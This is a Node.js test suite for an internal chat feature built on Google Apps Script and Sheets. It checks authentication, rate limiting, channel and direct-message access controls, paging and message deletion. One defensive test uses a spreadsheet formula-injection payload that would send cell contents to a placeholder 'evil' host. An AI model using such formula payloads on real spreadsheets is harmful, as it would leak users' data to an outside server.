// Test chat noi bo (gas/23_Chat.gs) bang GAS gia lap. Chay: node tools/test-chat.js  -> "ALL TESTS PASSED"
const fs = require('fs'), vm = require('vm'), path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'gas_v13.js'), 'utf8');
const chatSrc = src.slice(src.indexOf('var SH_CHAT_CH_ ='));
let fails = 0, n = 0;
function ok(c, m) { n++; if (!c) { fails++; console.log('  FAIL: ' + m); } }

function makeEnv() {
  const store = {};                       // ten sheet -> mang dong (dong 0 = header)
  let reads = 0;                          // dem so lan doc sheet tin nhan (kiem tra duong poll nhanh)
  function Sheet(name) {
    const rows = store[name];
    return {
      getLastRow: () => rows.length, getMaxRows: () => 1000,
      appendRow: r => { rows.push(r.slice()); },
      getRange: (r, c, nr, nc) => ({
        getValues: () => {
          if (name === 'Chat_TinNhan') reads++;
          const out = [];
          for (let i = 0; i < (nr || 1); i++) {
            const row = rows[r - 1 + i] || [], o = [];
            for (let j = 0; j < (nc || 1); j++) { let v = row[c - 1 + j]; if (v === undefined) v = ''; if (typeof v === 'string' && v[0] === "'") v = v.slice(1); o.push(v); }   // Sheets bo dau ' dau chuoi
            out.push(o);
          }
          return out;
        },
        setValue: v => { rows[r - 1][c - 1] = v; }, setNumberFormat: () => {}
      })
    };
  }
  const cacheData = {};
  const props = {};
  const users = { 'an': { username: 'an', name: 'An', team: 'A', role: 'cs', active: true }, 'binh': { username: 'binh', name: 'Binh', team: 'B', role: 'cs', active: true },
    'chi': { username: 'chi', name: 'Chi', team: 'A', role: 'cs', active: true }, 'admin': { username: 'admin', name: 'Quan tri', team: '', role: 'admin', active: true },
    'nghi': { username: 'nghi', name: 'Nghi', team: 'A', role: 'cs', active: false } };
  const ctx = {
    console, Math, Date, JSON, Object, Array, String, Number, isFinite, Infinity, Promise,
    SH_USER: 'Users',
    jsonOut_: o => o,
    getCrmSS_: () => ({ getSheetByName: n => (store[n] ? Sheet(n) : null) }),
    getSheet_: (name, headers) => { if (!store[name]) store[name] = [headers.slice()]; return Sheet(name); },
    readUsers_: () => Object.keys(users).map(k => users[k]),
    _sessVerify_: t => (users[t] ? { u: t } : null),
    _sessUser_: t => (users[t] && users[t].active ? users[t] : null),
    CacheService: { getScriptCache: () => ({ get: k => (k in cacheData ? cacheData[k] : null), put: (k, v) => { cacheData[k] = String(v); }, remove: k => { delete cacheData[k]; } }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null), setProperty: (k, v) => { props[k] = String(v); } }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) }
  };
  vm.createContext(ctx);
  vm.runInContext(chatSrc, ctx);
  ctx.__store = store; ctx.__cache = cacheData; ctx.__reads = () => reads; ctx.__resetReads = () => { reads = 0; };
  // gia lap thoi gian de vuot gioi han rate-limit
  let now = 1800000000000; ctx.Date = class extends Date { static now() { return now; } };
  ctx.__tick = ms => { now += ms; };
  vm.runInContext('var Date = this.Date;', ctx);
  return ctx;
}
function send(c, tok, ch, text, extra) { c.__tick(1000); return c.chatSend_(Object.assign({ token: tok, channel: ch, text: text }, extra || {})); }

(function authAndBasic() {
  const c = makeEnv();
  ok(c.chatPoll_({ token: 'sai', since: 0 }).code === 'AUTH', 'poll token sai -> AUTH');
  ok(c.chatSend_({ token: '', channel: 'general', text: 'x' }).code === 'AUTH', 'send khong token -> AUTH');
  ok(c.chatChannels_({ token: 'nghi' }).code === 'AUTH', 'tai khoan bi khoa -> AUTH');
  const r = send(c, 'an', 'general', 'Xin chao', { from: 'admin', fromName: 'GIA MAO', u: 'admin' });
  ok(r.ok && r.msg.u === 'an' && r.msg.n === 'An', 'nguoi gui lay tu token, bo qua from do client gui');
  const r2 = c.chatSend_({ token: 'an', channel: 'general', text: 'lien tiep' });   // KHONG tick -> trong 500ms ke tu tin truoc
  ok(!r2.ok, 'gui qua nhanh bi chan (rate limit)');
  ok(!send(c, 'an', 'general', '   ').ok, 'tin rong bi tu choi');
  ok(!send(c, 'an', 'general', 'x'.repeat(2001)).ok, 'tin > 2000 ky tu bi tu choi');
  const p = c.chatPoll_({ token: 'binh', since: 0 });
  ok(p.ok && p.msgs.length === 1 && p.msgs[0].t === 'Xin chao', 'binh poll thay tin kenh chung');
})();

(function fastPath() {
  const c = makeEnv();
  send(c, 'an', 'general', 'm1');
  const last = c.chatPoll_({ token: 'binh', since: 0 }).last;
  c.__resetReads();
  const p = c.chatPoll_({ token: 'binh', since: last });
  ok(p.ok && p.msgs.length === 0 && c.__reads() === 0, 'poll khong co tin moi KHONG doc sheet tin nhan');
  c.__cache.chat_ring = undefined; delete c.__cache.chat_ring;           // het han vong dem
  const p2 = c.chatPoll_({ token: 'binh', since: 0 });
  ok(p2.msgs.length === 1, 'vong dem het han van doc duoc tu sheet');
  delete c.__cache.chat_last; delete c.__cache.chat_ring;                // mat ca cache -> lay lai tu Properties
  ok(c.chatPoll_({ token: 'binh', since: 0 }).msgs.length === 1, 'mat cache chat_last van dung (Properties)');
})();

(function channelsAccess() {
  const c = makeEnv();
  ok(!send(c, 'binh', 'team:a', 'chen vao team A').ok, 'binh (team B) khong gui vao kenh team A');
  ok(send(c, 'an', 'team:a', 'team A noi bo').ok, 'an (team A) gui duoc vao kenh team A');
  ok(send(c, 'admin', 'team:a', 'admin vao team A').ok, 'admin vao duoc moi kenh team');
  ok(c.chatPoll_({ token: 'binh', since: 0 }).msgs.length === 0, 'binh khong thay tin cua team A');
  ok(c.chatPoll_({ token: 'chi', since: 0 }).msgs.length === 2, 'chi (team A) thay tin team A');
  const lst = c.chatChannels_({ token: 'an' }).channels.map(x => x.id);
  ok(lst.indexOf('general') >= 0 && lst.indexOf('team:a') >= 0 && lst.indexOf('team:b') < 0, 'danh sach kenh dung theo team');
  ok(c.chatChannels_({ token: 'admin' }).channels.map(x => x.id).indexOf('team:b') >= 0, 'admin thay moi kenh team');
  // nhom rieng
  const g = c.chatCreateChannel_({ token: 'an', name: 'Nhom VIP', type: 'private', members: ['binh', 'khong-ton-tai', 'nghi'] });
  ok(g.ok && g.channel.members.join() === 'an,binh', 'nhom private: chi giu thanh vien hop le va dang hoat dong, them nguoi tao');
  ok(send(c, 'binh', g.channel.id, 'chao nhom').ok, 'thanh vien gui duoc vao nhom');
  ok(!send(c, 'chi', g.channel.id, 'toi khong thuoc nhom').ok, 'nguoi ngoai KHONG gui duoc vao nhom');
  ok(c.chatHistory_({ token: 'chi', channel: g.channel.id }).ok === false, 'nguoi ngoai KHONG doc duoc lich su nhom');
  ok(c.chatHistory_({ token: 'admin', channel: g.channel.id }).ok === false, 'admin cung khong doc nhom private (rieng tu)');
  ok(!c.chatCreateChannel_({ token: 'an', name: 'Kenh chung 2', type: 'public' }).ok, 'cs khong tao duoc kenh public');
  ok(c.chatCreateChannel_({ token: 'admin', name: 'Thong bao', type: 'public' }).ok, 'admin tao duoc kenh public');
  ok(!c.chatCreateChannel_({ token: 'admin', name: 'thong bao', type: 'public' }).ok, 'khong tao kenh trung ten');
  ok(!c.chatUpdateChannel_({ token: 'binh', id: g.channel.id, addMembers: ['chi'] }).ok, 'thanh vien thuong khong them nguoi vao nhom');
  ok(c.chatUpdateChannel_({ token: 'an', id: g.channel.id, addMembers: ['chi'] }).ok, 'nguoi tao them thanh vien');
  ok(send(c, 'chi', g.channel.id, 'cam on').ok, 'thanh vien moi gui duoc');
  ok(c.chatUpdateChannel_({ token: 'chi', id: g.channel.id, leave: true }).ok, 'thanh vien tu roi nhom');
  ok(!send(c, 'chi', g.channel.id, 'da roi').ok, 'sau khi roi khong gui duoc');
})();

(function dm() {
  const c = makeEnv();
  ok(send(c, 'an', 'dm:an|binh', 'rieng tu 1-1').ok, 'dm hop le (a<b) duoc tao luc gui dau tien');
  ok(!send(c, 'chi', 'dm:an|binh', 'doc trom').ok, 'nguoi thu 3 khong gui vao dm cua nguoi khac');
  ok(!send(c, 'an', 'dm:binh|an', 'sai thu tu').ok, 'id dm sai thu tu bi tu choi (tranh tao 2 kenh cho 1 cap)');
  ok(!send(c, 'an', 'dm:an|an', 'tu nhan').ok, 'khong tu nhan voi chinh minh');
  ok(!send(c, 'an', 'dm:an|nghi', 'nguoi bi khoa').ok, 'khong tao dm voi tai khoan bi khoa');
  ok(!send(c, 'an', 'dm:an|ma', 'khong ton tai').ok, 'khong tao dm voi nguoi khong ton tai');
  ok(send(c, 'chi', 'dm:an|chi', 'chi nhan an').ok, 'dm an|chi do chi gui hop le');
  ok(c.chatChannels_({ token: 'binh' }).channels.some(x => x.id === 'dm:an|binh'), 'binh thay dm trong danh sach kenh');
  ok(!c.chatChannels_({ token: 'chi' }).channels.some(x => x.id === 'dm:an|binh'), 'chi khong thay dm cua an-binh');
  ok(c.chatPoll_({ token: 'chi', since: 0 }).msgs.every(m => m.c !== 'dm:an|binh'), 'poll cua chi khong lo tin dm an-binh');
})();

(function injectionAndDelete() {
  const c = makeEnv();
  const t = '=IMPORTXML("http://evil/"&A1,"//a")';
  const r = send(c, 'an', 'general', t);
  const stored = c.__store.Chat_TinNhan[1][4];
  ok(stored === "'" + t, 'tin bat dau bang = duoc chen dau \' truoc khi ghi sheet (chong cong thuc)');
  ok(r.msg.t === t, 'noi dung tra ve client giu nguyen');
  const h = c.chatHistory_({ token: 'binh', channel: 'general' });
  ok(h.msgs[0].t === t, 'doc lai tu sheet ra dung noi dung goc');
  const m1 = r.msg.id;
  ok(!c.chatDelete_({ token: 'binh', id: m1 }).ok, 'nguoi khac khong xoa duoc tin cua an');
  const d0 = c.chatPoll_({ token: 'binh', since: 0 }).dver;
  c.__tick(5);
  ok(c.chatDelete_({ token: 'an', id: m1 }).ok, 'nguoi gui xoa duoc tin cua minh');
  ok(c.chatPoll_({ token: 'binh', since: 0 }).dver > d0, 'dver tang sau khi xoa');
  ok(c.chatHistory_({ token: 'binh', channel: 'general' }).msgs.length === 0, 'tin da xoa khong con trong lich su');
  const r2 = send(c, 'an', 'general', 'tin 2');
  ok(c.chatDelete_({ token: 'admin', id: r2.msg.id }).ok, 'admin xoa duoc tin cua nguoi khac');
  ok(c.chatPoll_({ token: 'binh', since: 0 }).msgs.length === 0, 'poll khong tra tin da xoa (vong dem da loc)');
})();

(function pagingAndFallback() {
  const c = makeEnv();
  for (let i = 1; i <= 130; i++) send(c, i % 2 ? 'an' : 'binh', 'general', 'tin ' + i);
  const p1 = c.chatHistory_({ token: 'chi', channel: 'general', limit: 50 });
  ok(p1.msgs.length === 50 && p1.msgs[49].t === 'tin 130' && p1.more === true, 'trang 1: 50 tin moi nhat, con nua');
  const p2 = c.chatHistory_({ token: 'chi', channel: 'general', limit: 50, before: p1.msgs[0].id });
  ok(p2.msgs.length === 50 && p2.msgs[49].t === 'tin 80', 'trang 2 noi tiep dung');
  const p3 = c.chatHistory_({ token: 'chi', channel: 'general', limit: 50, before: p2.msgs[0].id });
  ok(p3.msgs.length === 30 && p3.more === false, 'trang 3: 30 tin cuoi, het');
  // since cu hon vong dem (200) -> doc tu sheet
  for (let i = 131; i <= 260; i++) send(c, 'an', 'general', 'tin ' + i);
  const ids = c.chatHistory_({ token: 'chi', channel: 'general', limit: 100 }).msgs;
  const old = c.chatPoll_({ token: 'chi', since: ids[0].id - 1 });
  ok(old.msgs.length > 0 && old.msgs.length <= 200, 'poll tu moc cu van tra tin (cap 200)');
})();

console.log(fails ? ('\n' + fails + '/' + n + ' FAILED') : ('ALL TESTS PASSED (' + n + ' checks)'));
process.exit(fails ? 1 : 0);
